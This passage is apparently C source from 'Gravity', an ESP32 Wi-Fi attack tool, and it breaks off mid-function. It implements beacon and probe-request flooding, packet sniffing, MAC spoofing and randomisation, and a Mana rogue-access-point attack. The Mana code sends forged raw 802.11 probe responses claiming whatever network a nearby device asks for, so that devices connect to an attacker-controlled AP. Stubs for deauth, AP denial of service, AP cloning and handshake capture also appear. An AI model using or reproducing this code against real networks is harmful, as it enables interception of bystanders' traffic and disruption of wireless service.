/* Basic console example (esp_console_repl API)

   This example code is in the Public Domain (or CC0 licensed, at your option.)

   Unless required by applicable law or agreed to in writing, this
   software is distributed on an "AS IS" BASIS, WITHOUT WARRANTIES OR
   CONDITIONS OF ANY KIND, either express or implied.
*/

#include "gravity.h"
#include "esp_err.h"
#include "esp_log.h"
#include "beacon.h"
#include "esp_wifi.h"
#include "esp_wifi_types.h"
#include "probe.h"

char **attack_ssids = NULL;
char **user_ssids = NULL;
int user_ssid_count = 0;
bool attack_status[ATTACKS_COUNT] = {false, false, false, false, false, false, false, false, false, false, true};

uint8_t probe_response_raw[] = {
0x50, 0x00, 0x3c, 0x00, 
0x08, 0x5a, 0x11, 0xf9, 0x23, 0x3d, // destination address
0x20, 0xe8, 0x82, 0xee, 0xd7, 0xd5, // source address
0x20, 0xe8, 0x82, 0xee, 0xd7, 0xd5, // BSSID
0xc0, 0x72,                         // Fragment number 0 seq number 1836
0xa3, 0x52, 0x5b, 0x8d, 0xd2, 0x00, 0x00, 0x00, 0x64, 0x00,
0x11, 0x11, // 802.11 Privacy Capability, 0x1101 == open auth. 0x11 0x01 or 0x01 0x11?
            /* Otherwise AND existing bytes with 0b11101111 */
0x00, 0x08, // Parameter Set (0), SSID Length (8)
            // To fill: SSID
0x01, 0x08, 0x8c, 0x12, 0x98, 0x24, 0xb0, 0x48, 0x60, 0x6c, 0x20, 0x01, 0x00, 0x23, 0x02, 0x14,
0x00, 0x30, 0x14, 0x01, 0x00,
0x00, 0x0f, 0xac,       /* Group cipher suite OUI */
0x04,                   /* Group cipher suite type: AES */
0x01, 0x00,             /* Pairwise cipher suite count */
0x00, 0x0f, 0xac,       /* Pairwise cipher suite OUI */
0x04,                   /* Pairwise cipher suite type: AES */
0x01, 0x00,             /* Auth key management suite count */
0x00, 0x0f, 0xac,       /* Auth key management OUI */
0x02,                   /* Auth key management type: PSK */
0x0c, 0x00, 0x46, 0x05, 0x32, 0x08, 0x01, 0x00, 0x00, 0x2d, 0x1a, 0xef, 0x08, 0x17, 0xff, 0xff,
0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x3d, 0x16, 0x95, 0x0d, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x7f, 0x08, 0x04,
0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x40, 0xbf, 0x0c, 0xb2, 0x58, 0x82, 0x0f, 0xea, 0xff, 0x00,
0x00, 0xea, 0xff, 0x00, 0x00, 0xc0, 0x05, 0x01, 0x9b, 0x00, 0x00, 0x00, 0xc3, 0x04, 0x02, 0x02,
0x02, 0x02,
0x71, 0xb5, 0x92, 0x42 // Frame check sequence
};

int PROBE_RESPONSE_DEST_ADDR_OFFSET = 4;
int PROBE_RESPONSE_SRC_ADDR_OFFSET = 10;
int PROBE_RESPONSE_BSSID_OFFSET = 16;
int PROBE_RESPONSE_PRIVACY_OFFSET = 34;
int PROBE_RESPONSE_SSID_OFFSET = 38;
int PROBE_RESPONSE_GROUP_CIPHER_OFFSET = 62; /* + ssid_len */
int PROBE_RESPONSE_PAIRWISE_CIPHER_OFFSET = 68; /* + ssid_len */
int PROBE_RESPONSE_AUTH_TYPE_OFFSET = 74; /* + ssid_len */

#define PROMPT_STR CONFIG_IDF_TARGET

/* Console command history can be stored to and loaded from a file.
 * The easiest way to do this is to use FATFS filesystem on top of
 * wear_levelling library.
 */
#if CONFIG_CONSOLE_STORE_HISTORY

#define MOUNT_PATH "/data"
#define HISTORY_PATH MOUNT_PATH "/history.txt"

/* Functions to manage target-ssids */
int countSsid() {
	return user_ssid_count;
}

char **lsSsid() {
	return user_ssids;
}

int addSsid(char *ssid) {
	#ifdef DEBUG
		printf("Commencing addSsid(\"%s\"). target-ssids contains %d values:\n", ssid, user_ssid_count);
		for (int i=0; i < user_ssid_count; ++i) {
			printf("    %d: \"%s\"\n", i, user_ssids[i]);
		}
	#endif
	char **newSsids = malloc(sizeof(char*) * (user_ssid_count + 1));
	if (newSsids == NULL) {
		ESP_LOGE(BEACON_TAG, "Insufficient memory to add new SSID");
		return ESP_ERR_NO_MEM;
	}
	for (int i=0; i < user_ssid_count; ++i) {
		newSsids[i] = user_ssids[i];
	}

	#ifdef DEBUG
		printf("After creating a larger array and copying across previous values the new array was allocated %d elements. Existing values are:\n", (user_ssid_count + 1));
		for (int i=0; i < user_ssid_count; ++i) {
			printf("    %d: \"%s\"\n", i, newSsids[i]);
		}
	#endif

	newSsids[user_ssid_count] = malloc(sizeof(char) * (strlen(ssid) + 1));
	if (newSsids[user_ssid_count] == NULL) {
		ESP_LOGE(BEACON_TAG, "Insufficient memory to add SSID \"%s\"", ssid);
		return ESP_ERR_NO_MEM;
	}
	strcpy(newSsids[user_ssid_count], ssid);
	++user_ssid_count;

	#ifdef DEBUG
		printf("After adding the final item and incrementing length counter newSsids has %d elements. The final item is \"%s\"\n", user_ssid_count, newSsids[user_ssid_count - 1]);
		printf("Pointers are:\tuser_ssids: %p\tnewSsids: %p\n", user_ssids, newSsids);
	#endif
	free(user_ssids);
	user_ssids = newSsids;
	#ifdef DEBUG
		printf("After freeing user_ssids and setting newSsids pointers are:\tuser_ssids: %p\tnewSsids: %p\n", user_ssids, newSsids);
	#endif

	return ESP_OK;
}

int rmSsid(char *ssid) {
	int idx;

	// Get index of ssid if it exists
	for (idx = 0; (idx < user_ssid_count && strcasecmp(ssid, user_ssids[idx])); ++idx) {}
	if (idx == user_ssid_count) {
		ESP_LOGW(BEACON_TAG, "Asked to remove SSID \'%s\', but could not find it in user_ssids", ssid);
		return ESP_ERR_INVALID_ARG;
	}

	char **newSsids = malloc(sizeof(char*) * (user_ssid_count - 1));
	if (newSsids == NULL) {
		ESP_LOGE(BEACON_TAG, "Unable to allocate memory to remove SSID \'%s\'", ssid);
		return ESP_ERR_NO_MEM;
	}

	// Copy shrunk array to newSsids
	for (int i = 0; i < user_ssid_count; ++i) {
		if (i < idx) {
			newSsids[i] = user_ssids[i];
		} else if (i > idx) {
			newSsids[i-1] = user_ssids[i];
		}
	}
	free(user_ssids[idx]);
	free(user_ssids);
	user_ssids = newSsids;
	--user_ssid_count;
	return ESP_OK;
}

int cmd_beacon(int argc, char **argv) {
    /* rickroll | random | user | off | status */
    /* Initially the 'TARGET MAC' argument is unsupported, the attack only supports broadcast beacon frames */
    /* argc must be 1 or 2 - no arguments, or rickroll/random/user/infinite/off */
    if (argc < 1 || argc > 3) {
        ESP_LOGE(TAG, "Invalid arguments specified. Expected 0 or 1, received %d.", argc - 1);
        return ESP_ERR_INVALID_ARG;
    }
    if (argc == 1) {
        ESP_LOGI(TAG, "Beacon Status: %s", attack_status[ATTACK_BEACON]?"Running":"Not Running");
        return ESP_OK;
    }

    /* Handle arguments to beacon */
    int ret = ESP_OK;
    int ssidCount = DEFAULT_SSID_COUNT;
    if (!strcasecmp(argv[1], "rickroll")) {
        ret = beacon_start(ATTACK_BEACON_RICKROLL, 0);
    } else if (!strcasecmp(argv[1], "random")) {
        if (SSID_LEN_MIN == 0) {
            SSID_LEN_MIN = 8;
        }
        if (SSID_LEN_MAX == 0) {
            SSID_LEN_MAX = 32;
        }
        if (argc == 3) {
            ssidCount = atoi(argv[2]);
            if (ssidCount == 0) {
                ssidCount = DEFAULT_SSID_COUNT;
            }
        }
        ret = beacon_start(ATTACK_BEACON_RANDOM, ssidCount);
    } else if (!strcasecmp(argv[1], "user")) {
        ret = beacon_start(ATTACK_BEACON_USER, 0);
    } else if (!strcasecmp(argv[1], "infinite")) {
        ret = beacon_start(ATTACK_BEACON_INFINITE, 0);
    } else if (!strcasecmp(argv[1], "off")) {
        ret = beacon_stop();
    } else {
        ESP_LOGE(TAG, "Invalid argument provided to BEACON: \"%s\"", argv[1]);
        return ESP_ERR_INVALID_ARG;
    }

    // Update attack_status[ATTACK_BEACON] appropriately
    if (ret == ESP_OK) {
        if (!strcasecmp(argv[1], "off")) {
            attack_status[ATTACK_BEACON] = false;
        } else {
            attack_status[ATTACK_BEACON] = true;
        }
    }
    return ret;
}

int cmd_target_ssids(int argc, char **argv) {
    int ssidCount = countSsid();
    // Must have no args (return current value) or two (add/remove SSID)
    if ((argc != 1 && argc != 3) || (argc == 1 && ssidCount == 0)) {
        if (ssidCount == 0) {
            ESP_LOGI(TAG, "targt-ssids has no elements.");
        } else {
            ESP_LOGE(TAG, "target-ssids must have either no arguments, to return its current value, or two arguments: ADD/REMOVE <ssid>");
            return ESP_ERR_INVALID_ARG;
        }
        return ESP_OK;
    }
    char temp[40];
    if (argc == 1) {
        char *strSsids = malloc(sizeof(char) * ssidCount * 32);
        if (strSsids == NULL) {
            ESP_LOGE(TAG, "Unable to allocate memory to display user SSIDs");
            return ESP_ERR_NO_MEM;
        }
        #ifdef DEBUG
            printf("Serialising target SSIDs");
        #endif
        strcpy(strSsids, (lsSsid())[0]);
        #ifdef DEBUG
            printf("Before serialisation loop returned value is \"%s\"\n", strSsids);
        #endif
        for (int i = 1; i < ssidCount; ++i) {
            sprintf(temp, " , %s", (lsSsid())[i]);
            strcat(strSsids, temp);
            #ifdef DEBUG
                printf("At the end of iteration %d retVal is \"%s\"\n",i, strSsids);
            #endif
        }
        printf("Selected SSIDs: %s\n", strSsids);
    } else if (!strcasecmp(argv[1], "add")) {
        return addSsid(argv[2]);
    } else if (!strcasecmp(argv[1], "remove")) {
        return rmSsid(argv[2]);
    }

    return ESP_OK;
}

int cmd_probe(int argc, char **argv) {
    // Syntax: PROBE [ ANY [ COUNT ] | SSIDS [ COUNT ] | OFF ]
    #ifdef DEBUG
        printf("cmd_probe start\n");
    #endif

    if ((argc > 3) || (argc > 1 && strcasecmp(argv[1], "ANY") && strcasecmp(argv[1], "SSIDS") && strcasecmp(argv[1], "OFF")) || (argc == 3 && !strcasecmp(argv[1], "OFF"))) {
        ESP_LOGW(PROBE_TAG, "Syntax: PROBE [ ANY | SSIDS | OFF ].  SSIDS uses the target-ssids specification.");
        return ESP_ERR_INVALID_ARG;
    }

    probe_attack_t probeType = ATTACK_PROBE_UNDIRECTED; // Default

    if (argc == 1) {
        ESP_LOGI(PROBE_TAG, "Probe Status: %s", (attack_status[ATTACK_PROBE])?"Running":"Not Running");
    } else if (!strcasecmp(argv[1], "OFF")) {
        ESP_LOGI(PROBE_TAG, "Stopping Probe Flood ...");
        probe_stop();
    } else {
        // Gather parameters for probe_start()
        if (!strcasecmp(argv[1], "SSIDS")) {
            probeType = ATTACK_PROBE_DIRECTED;
        }

        char probeNote[100];
        sprintf(probeNote, "Starting a probe flood of %spackets%s", (probeType == ATTACK_PROBE_UNDIRECTED)?"broadcast ":"", (probeType == ATTACK_PROBE_DIRECTED)?" directed to ":"");
        if (probeType == ATTACK_PROBE_DIRECTED) {
            char suffix[16];
            sprintf(suffix, "%d SSIDs", countSsid());
            strcat(probeNote, suffix);
        }

        ESP_LOGI(PROBE_TAG, "%s", probeNote);
        probe_start(probeType);
    }

    // Set attack_status[ATTACK_PROBE]
    if (argc > 1) {
        if (!strcasecmp(argv[1], "off")) {
            attack_status[ATTACK_PROBE] = false;
        } else {
            attack_status[ATTACK_PROBE] = true;
        }
    }
    return ESP_OK;
}

int cmd_sniff(int argc, char **argv) {
    // Usage: sniff [ ON | OFF ]
    if (argc > 2) {
        ESP_LOGE(TAG, "Usage: sniff [ ON | OFF ]");
        return ESP_ERR_INVALID_ARG;
    }
    if (argc == 1) {
        ESP_LOGI(TAG, "Sniffing is %s", (attack_status[ATTACK_SNIFF])?"enabled":"disabled");
        return ESP_OK;
    }
    // If we get here argc==2
    if (!strcasecmp(argv[1], "on")) {
        attack_status[ATTACK_SNIFF] = true;
    } else if (!strcasecmp(argv[1], "off")) {
        attack_status[ATTACK_SNIFF] = false;
    } else {
        ESP_LOGE(TAG, "Usage: sniff [ ON | OFF ]");
        return ESP_ERR_INVALID_ARG;
    }

    return ESP_OK;
}

int cmd_deauth(int argc, char **argv) {

    return ESP_OK;
}

/* Control the Mana attack
   The Mana attack is intended to 'trick' wireless devices into
   connecting to an AP that you control by impersonating a known
   trusted AP.
   Mana listens for directed probe requests (those that specify
   an SSID) and responds with the corresponding probe response,
   claiming to have the SSID requested.
   As long as the device's MAC does not change during the attack
   (so don't run an attack with MAC hopping simultaneously), the
   target station may then begin association with Gravity.
   This attack is typically successful only for SSID's that use
   open authentication (i.e. no password); if a STA is expecting
   an SSID it trusts to offer the open authentication it expects,
   the device will proceed to associate and allow Gravity to
   control its network connectivity.
   Usage: mana [ VERBOSE ] [ ON | OFF ]
   VERBOSE :  Display messages as packets are sent and received,
              providing attack status
   ON | OFF:  Start or stop either the Mana attack or verbose logging

   TODO :  Display status of attack - Number of responses sent,
           number of association attempts, number of successful
           associations.

 */
int cmd_mana(int argc, char **argv) {
    if (argc > 3) {
        ESP_LOGE(TAG, "Usage: mana [ VERBOSE ] [ ON | OFF ]");
        return ESP_ERR_INVALID_ARG;
    }
    if (argc == 1) {
        ESP_LOGI(TAG, "GRAVITY :  Mana is %s", (attack_status[ATTACK_MANA])?"Enabled":"Disabled");
    } else if (!strcasecmp(argv[1], "VERBOSE")) {
        if (argc == 2) {
            ESP_LOGI(TAG, "GRAVITY : Mana Verbose Logging is %s", (attack_status[ATTACK_MANA_VERBOSE])?"Enabled":"Disabled");
        } else if (argc == 3 && (!strcasecmp(argv[2], "ON") || !strcasecmp(argv[2], "OFF"))) {
            attack_status[ATTACK_MANA_VERBOSE] = strcasecmp(argv[2], "OFF");
        } else {
            ESP_LOGE(TAG, "Usage: mana [ VERBOSE ] [ ON | OFF ]");
            return ESP_ERR_INVALID_ARG;
        }
    } else if (!strcasecmp(argv[1], "OFF") || !strcasecmp(argv[1], "ON")) {
        attack_status[ATTACK_MANA] = strcasecmp(argv[1], "OFF");
    } else {
        ESP_LOGE(TAG, "Usage: mana [ VERBOSE ] [ ON | OFF ]");
        return ESP_ERR_INVALID_ARG;
    }
    return ESP_OK;
}

int cmd_stalk(int argc, char **argv) {

    return ESP_OK;
}

int cmd_ap_dos(int argc, char **argv) {

    return ESP_OK;
}

int cmd_ap_clone(int argc, char **argv) {

    return ESP_OK;
}

int cmd_scan(int argc, char **argv) {

    return ESP_OK;
}

/* Set application configuration variables */
/* At the moment these config settings are not retained between
   Gravity instances. Many of them are initialised in beacon.h.
   Usage: set <variable> <value>
   Allowed values for <variable> are:
      SSID_LEN_MIN, SSID_LEN_MAX, DEFAULT_SSID_COUNT, CHANNEL,
      MAC, HOP_MILLIS, ATTACK_PKTS, ATTACK_MILLIS */
int cmd_set(int argc, char **argv) {
    if (argc != 3) {
        ESP_LOGE(TAG, "Invalid arguments provided. Usage: set <variable> <value>");
        ESP_LOGE(TAG, "<variable> : SSID_LEN_MIN | SSID_LEN_MAX | DEFAULT_SSID_COUNT | CHANNEL |");
        ESP_LOGE(TAG, "             MAC | HOP_MILLIS | ATTACK_PKTS | ATTACK_MILLIS | MAC_RAND");
        return ESP_ERR_INVALID_ARG;
    }
    if (!strcasecmp(argv[1], "SSID_LEN_MIN")) {
        //
        int iVal = atoi(argv[2]);
        if (iVal < 0 || iVal > SSID_LEN_MAX) {
            ESP_LOGE(TAG, "Invalid value specified. SSID_LEN_MIN must be between 0 and SSID_LEN_MAX (%d).", SSID_LEN_MAX);
            return ESP_ERR_INVALID_ARG;
        }
        SSID_LEN_MIN = iVal;
        ESP_LOGI(TAG, "SSID_LEN_MIN is now %d", SSID_LEN_MIN);
        return ESP_OK;
    } else if (!strcasecmp(argv[1], "SSID_LEN_MAX")) {
        //
        int iVal = atoi(argv[2]);
        if (iVal < SSID_LEN_MIN) {
            ESP_LOGE(TAG, "Invalid value specified. SSID_LEN_MAX must be greater than SSID_LEN_MIN (%d)", SSID_LEN_MIN);
            return ESP_ERR_INVALID_ARG;
        }
        SSID_LEN_MAX = iVal;
        ESP_LOGI(TAG, "SSID_LEN_MAX is now %d", SSID_LEN_MAX);
        return ESP_OK;
    } else if (!strcasecmp(argv[1], "DEFAULT_SSID_COUNT")) {
        //
        int iVal = atoi(argv[2]);
        if (iVal <= 0) {
            ESP_LOGE(TAG, "Invalid value specified. DEFAULT_SSID_COUNT must be a positive integer. Received %d", iVal);
            return ESP_ERR_INVALID_ARG;
        }
        DEFAULT_SSID_COUNT = iVal;
        ESP_LOGI(TAG, "DEFAULT_SSID_COUNT is now %d", DEFAULT_SSID_COUNT);
        return ESP_OK;
    } else if (!strcasecmp(argv[1], "CHANNEL")) {
        //
        uint8_t channel = atoi(argv[2]);
        wifi_second_chan_t chan2 = WIFI_SECOND_CHAN_ABOVE;
        esp_err_t err = esp_wifi_set_channel(channel, chan2);
        if (err != ESP_OK) {
            ESP_LOGE(TAG, "Error while setting channel: %s", esp_err_to_name(err));
        } else {
            ESP_LOGI(TAG, "Successfully changed to channel %u", channel);
        }
        return err;
    } else if (!strcasecmp(argv[1], "MAC")) {
        //
        uint8_t bMac[6];
        esp_err_t err = mac_string_to_bytes(argv[2], bMac);
        if ( err != ESP_OK) {
            ESP_LOGE(TAG, "Unable to convert \"%s\" to a byte array: %s.", argv[2], esp_err_to_name(err));
            return err;
        }
        err = esp_wifi_set_mac(WIFI_IF_AP, bMac);
        if (err != ESP_OK) {
            ESP_LOGE(TAG, "Failed to set MAC :  %s", esp_err_to_name(err));
            return err;
        }
        ESP_LOGI(TAG, "Set MAC to :  %s", argv[2]);
        return ESP_OK;
    } else if (!strcasecmp(argv[1], "MAC_RAND")) {
        if (!strcasecmp(argv[2], "ON")) {
            attack_status[ATTACK_RANDOMISE_MAC] = true;
        } else if (!strcasecmp(argv[2], "OFF")) {
            attack_status[ATTACK_RANDOMISE_MAC] = false;
        } else {
            ESP_LOGE(TAG, "Usage: set MAC_RAND [ ON | OFF ]");
            return ESP_ERR_INVALID_ARG;
        }
        ESP_LOGI(TAG, "MAC randomisation :  %s", (attack_status[ATTACK_RANDOMISE_MAC])?"ON":"OFF");
        return ESP_OK;
    } else if (!strcasecmp(argv[1], "HOP_MILLIS")) {
        ESP_LOGI(TAG, "This command has not been implemented.");
    } else if (!strcasecmp(argv[1], "ATTACK_PKTS")) {
        ESP_LOGI(TAG, "This command has not been implemented.");
    } else if (!strcasecmp(argv[1], "ATTACK_MILLIS")) {
        ESP_LOGI(TAG, "This command has not been implemented.");
    } else {
        ESP_LOGE(TAG, "Invalid variable specified. Usage: set <variable> <value>");
        ESP_LOGE(TAG, "<variable> : SSID_LEN_MIN | SSID_LEN_MAX | DEFAULT_SSID_COUNT | CHANNEL |");
        ESP_LOGE(TAG, "             MAC | HOP_MILLIS | ATTACK_PKTS | ATTACK_MILLIS");
        return ESP_ERR_INVALID_ARG;
    }

    return ESP_OK;
}

/* Get application configuration items */
/* Usage: set <variable> <value>
   Allowed values for <variable> are:
      SSID_LEN_MIN, SSID_LEN_MAX, DEFAULT_SSID_COUNT, CHANNEL,
      MAC, HOP_MILLIS, ATTACK_PKTS, ATTACK_MILLIS */
int cmd_get(int argc, char **argv) {
    if (argc != 2) {
        ESP_LOGE(TAG, "Usage: get <variable>");
        ESP_LOGE(TAG, "<variable> : SSID_LEN_MIN | SSID_LEN_MAX | DEFAULT_SSID_COUNT | CHANNEL |");
        ESP_LOGE(TAG, "             MAC | HOP_MILLIS | ATTACK_PKTS | ATTACK_MILLIS | MAC_RAND");
        return ESP_ERR_INVALID_ARG;
    }
    if (!strcasecmp(argv[1], "SSID_LEN_MIN")) {
        ESP_LOGI(TAG, "SSID_LEN_MIN :  %d", SSID_LEN_MIN);
    } else if (!strcasecmp(argv[1], "SSID_LEN_MAX")) {
        ESP_LOGI(TAG, "SSID_LEN_MAX :  %d", SSID_LEN_MAX);
    } else if (!strcasecmp(argv[1], "DEFAULT_SSID_COUNT")) {
        ESP_LOGI(TAG, "DEFAULT_SSID_COUNT :  %d", DEFAULT_SSID_COUNT);
    } else if (!strcasecmp(argv[1], "CHANNEL")) {
        uint8_t channel;
        wifi_second_chan_t second;
        printf("Get channel 1\n");
        esp_err_t err = esp_wifi_get_channel(&channel, &second);
        printf("Get channel 2\n");
        if (err != ESP_OK) {
            ESP_LOGE(TAG, "Failed to get current channel: %s", esp_err_to_name(err));
            return err;
        }
        printf("checkpoint 1");
        char *secondary;
        printf("Get channel 3\n");
        switch (second) {
        case WIFI_SECOND_CHAN_NONE:
            secondary = "WIFI_SECOND_CHAN_NONE";
            break;
        case WIFI_SECOND_CHAN_ABOVE:
            secondary = "WIFI_SECOND_CHAN_ABOVE";
            break;
        case WIFI_SECOND_CHAN_BELOW:
            secondary = "WIFI_SECOND_CHAN_BELOW";
            break;
        default:
            ESP_LOGW(TAG, "esp_wifi_get_channel() returned a weird second channel - %d", second);
            secondary = "";
        }
        printf("Get channel 4\n");
        ESP_LOGI(TAG, "Channel: %u   Secondary: %s", channel, secondary);
        return ESP_OK;
    } else if (!strcasecmp(argv[1], "MAC")) {
        //
        uint8_t bMac[6];
        char strMac[18];
        esp_err_t err = esp_wifi_get_mac(WIFI_IF_AP, bMac);
        if (err != ESP_OK) {
            ESP_LOGE(TAG, "Failed to get MAC address from WiFi driver: %s", esp_err_to_name(err));
            return err;
        }
        err = mac_bytes_to_string(bMac, strMac);
        if (err != ESP_OK) {
            ESP_LOGE(TAG, "Failed to convert MAC bytes to string: %s", esp_err_to_name(err));
            return err;
        }
        ESP_LOGI(TAG, "Current MAC :  %s", strMac);
        return ESP_OK;
    } else if (!strcasecmp(argv[1], "MAC_RAND")) {
        ESP_LOGI(TAG, "MAC Randomisation is :  %s", (attack_status[ATTACK_RANDOMISE_MAC])?"ON":"OFF");
        return ESP_OK;
    } else if (!strcasecmp(argv[1], "HOP_MILLIS")) {
        //
        ESP_LOGI(TAG, "Not yet implemented");
    } else if (!strcasecmp(argv[1], "ATTACK_PKTS")) {
        //
        ESP_LOGI(TAG, "Not yet implemented");
    } else if (!strcasecmp(argv[1], "ATTACK_MILLIS")) {
        //
    } else {
        ESP_LOGE(TAG, "Invalid variable specified. Usage: get <variable>");
        ESP_LOGE(TAG, "<variable> : SSID_LEN_MIN | SSID_LEN_MAX | DEFAULT_SSID_COUNT | CHANNEL |");
        ESP_LOGE(TAG, "             MAC | HOP_MILLIS | ATTACK_PKTS | ATTACK_MILLIS");
        return ESP_ERR_INVALID_ARG;
    }

    return ESP_OK;
}

int cmd_view(int argc, char **argv) {

    return ESP_OK;
}

int cmd_select(int argc, char **argv) {

    return ESP_OK;
}

int cmd_handshake(int argc, char **argv) {

    return ESP_OK;
}

esp_err_t send_probe_response(uint8_t *srcAddr, uint8_t *destAddr, char *ssid, enum PROBE_RESPONSE_AUTH_TYPE authType) {
    uint8_t probeBuffer[208];

    #ifdef DEBUG
        printf("send_probe_response(): ");
        char strSrcAddr[18];
        char strDestAddr[18];
        char strAuthType[15];
        mac_bytes_to_string(srcAddr, strSrcAddr);
        mac_bytes_to_string(destAddr, strDestAddr);
        switch (authType) {
        case AUTH_TYPE_NONE:
            strcpy(strAuthType, "AUTH_TYPE_NONE");
            break;
        case AUTH_TYPE_WEP:
            strcpy(strAuthType, "AUTH_TYPE_WEP");
            break;
        case AUTH_TYPE_WPA:
            strcpy(strAuthType, "AUTH_TYPE_WPA");
            break;
        }
        printf("srcAddr: %s\tdestAddr: %s\tSSID: \"%s\"\tauthType: %s\n", strSrcAddr, strDestAddr, ssid, strAuthType);
    #endif

    /* Copy bytes to SSID (correct src/dest later) */
    memcpy(probeBuffer, probe_response_raw, PROBE_RESPONSE_SSID_OFFSET - 1);
    /* Replace SSID length and append SSID */
    probeBuffer[PROBE_RESPONSE_SSID_OFFSET - 1] = strlen(ssid);
    memcpy(&probeBuffer[PROBE_RESPONSE_SSID_OFFSET], ssid, strlen(ssid));
    /* Append the remainder of the packet */
    memcpy(&probeBuffer[PROBE_RESPONSE_SSID_OFFSET + strlen(ssid)], &probe_response_raw[PROBE_RESPONSE_SSID_OFFSET], sizeof(probe_response_raw) - PROBE_RESPONSE_SSID_OFFSET);
    
    /* Set source and dest MACs */
    memcpy(&probeBuffer[PROBE_RESPONSE_SRC_ADDR_OFFSET], srcAddr, 6);
    memcpy(&probeBuffer[PROBE_RESPONSE_BSSID_OFFSET], srcAddr, 6);
    memcpy(&probeBuffer[PROBE_RESPONSE_DEST_ADDR_OFFSET], destAddr, 6);

    /* Set authentication method */
    uint8_t *bAuthType = NULL;
    switch (authType) {
    case AUTH_TYPE_NONE:
        bAuthType = AUTH_TYPE_NONE_BYTES;
        break;
    case AUTH_TYPE_WEP:
        bAuthType = AUTH_TYPE_WEP_BYTES;
        break;
    case AUTH_TYPE_WPA:
        bAuthType = AUTH_TYPE_WPA_BYTES;
        break;
    default:
        ESP_LOGE(MANA_TAG, "Unrecognised authentication type: %d\n", authType);
        return ESP_ERR_INVALID_ARG;
    }
    memcpy(&probeBuffer[PROBE_RESPONSE_PRIVACY_OFFSET], bAuthType, 2);

    #ifdef DEBUG
        char debugOut[1024];
        int debugLen=0;
        strcpy(debugOut, "SSID: \"");
        debugLen += strlen("SSID: \"");
        strncpy(&debugOut[debugLen], (char*)&probeBuffer[PROBE_RESPONSE_SSID_OFFSET], probeBuffer[PROBE_RESPONSE_SSID_OFFSET-1]);
        debugLen += probeBuffer[PROBE_RESPONSE_SSID_OFFSET-1];
        sprintf(&debugOut[debugLen], "\"\tsrcAddr: ");
        debugLen += strlen("\"\tsrcAddr: ");
        char strMac[18];
        mac_bytes_to_string(&probeBuffer[PROBE_RESPONSE_SRC_ADDR_OFFSET], strMac);
        strncpy(&debugOut[debugLen], strMac, strlen(strMac));
        debugLen += strlen(strMac);
        sprintf(&debugOut[debugLen], "\tBSSID: ");
        debugLen += strlen("\tBSSID: ");
        mac_bytes_to_string(&probeBuffer[PROBE_RESPONSE_BSSID_OFFSET], strMac);
        strncpy(&debugOut[debugLen], strMac, strlen(strMac));
        debugLen += strlen(strMac);
        sprintf(&debugOut[debugLen], "\tdestAddr: ");
        debugLen += strlen("\tdestAddr: ");
        mac_bytes_to_string(&probeBuffer[PROBE_RESPONSE_DEST_ADDR_OFFSET], strMac);
        strncpy(&debugOut[debugLen], strMac, strlen(strMac));
        debugLen += strlen(strMac);
        sprintf(&debugOut[debugLen], "\tAuthType: \"0x%02x 0x%02x\"\n", probeBuffer[PROBE_RESPONSE_PRIVACY_OFFSET], probeBuffer[PROBE_RESPONSE_PRIVACY_OFFSET+1]);
        debugLen += strlen("\tAuthType: \"0x 0x\"\n") + 4;
        debugOut[debugLen] = '\0';
        printf("About to transmit %s\n", debugOut);
    #endif

    // Send the frame
    return esp_wifi_80211_tx(WIFI_IF_AP, probeBuffer, sizeof(probe_response_raw) + strlen(ssid), true);
}

void wifi_pkt_rcvd(void *buf, wifi_promiscuous_pkt_type_t type) {
    wifi_promiscuous_pkt_t *data = (wifi_promiscuous_pkt_t *)buf;

    if (!(attack_status[ATTACK_SNIFF] || attack_status[ATTACK_MANA])) {
        // No reason to listen to the packets
        return;
    }

    uint8_t *payload = data->payload;
    if (payload == NULL) {
        // Not necessarily an error, just a different payload
        return;
    }
    // TODO: new file - parse_80211.c - Here call parse_80211_frame(payload)
    if (payload[0] == 0x40) {
        //printf("W00T! Got a probe request!\n");
        int ssid_len = payload[PROBE_SSID_OFFSET - 1];
        char *ssid = malloc(sizeof(char) * (ssid_len + 1));
        // TODO: Check result
        strncpy(ssid, (char *)&payload[PROBE_SSID_OFFSET], ssid_len);
        ssid[ssid_len] = '\0';
        
        if (attack_status[ATTACK_SNIFF] || attack_status[ATTACK_MANA_VERBOSE]) {
            char *srcMac = malloc(sizeof(char) * 18);
            // TODO: Check result
            esp_err_t err = mac_bytes_to_string(&payload[PROBE_SRCADDR_OFFSET], srcMac);
            ESP_LOGI(TAG, "Probe for \"%s\" from %s", ssid, srcMac);
            free(srcMac);
        }
        if (attack_status[ATTACK_MANA]) {
            /* Mana enabled - Send a probe response
               Get current MAC - NOTE: MAC hopping during the Mana attack will render the attack useless
                                       Make sure you're not running a process that uses MAC randomisation at the same time
            */
            if (ssid_len == 0) {
                /* Broadcast probe request - send a probe response for every SSID in the STA's PNL */
                // TODO - networkList[i].mac === &payload[PROBE_SRCADDR_OFSET] for 6 bytes
                //        iterate through networkList[i].ssidCount elements of networkList[i].ssids[]
            } else {
                /* Send a directed probe response in reply */
                uint8_t bCurrentMac[6];
                char strCurrentMac[18];
                esp_err_t err = esp_wifi_get_mac(WIFI_IF_AP, bCurrentMac);
                if (err == ESP_OK) {
                    mac_bytes_to_string(bCurrentMac, strCurrentMac);
                } else {
                    memcpy(bCurrentMac, &payload[PROBE_DESTADDR_OFFSET], 6);
                    mac_bytes_to_string(bCurrentMac, strCurrentMac);
                    ESP_LOGW(MANA_TAG, "Failed to get MAC from device, falling back to the frame's BSSID: %s\n", strCurrentMac);
                }
                /* Copy destMac into a 6-byte array */
                uint8_t bDestMac[6];
                memcpy(bDestMac, &payload[PROBE_SRCADDR_OFFSET], 6);

                // TODO : Config option to set auth type. For now just do open auth

                /* Mana attack - Add the current SSID to the station's preferred network
                   list if it's not already there 
                */
                int i;
                char strDestMac[18];
                err = mac_bytes_to_string(bDestMac, strDestMac);
                if (err != ESP_OK) {
                    ESP_LOGE(MANA_TAG, "Unable to convert probe request source MAC from bytes to string: %s", esp_err_to_name(err));
                    return;
                }
                /* Look for STA's MAC in networkList[] */
                for (i=0; i < networkCount && strcmp(strDestMac, networkList[i].strMac); ++i) { }
                if (i < networkCount) {
                    /* The station is in networkList[] - See if it contains the SSID */
                    int j;
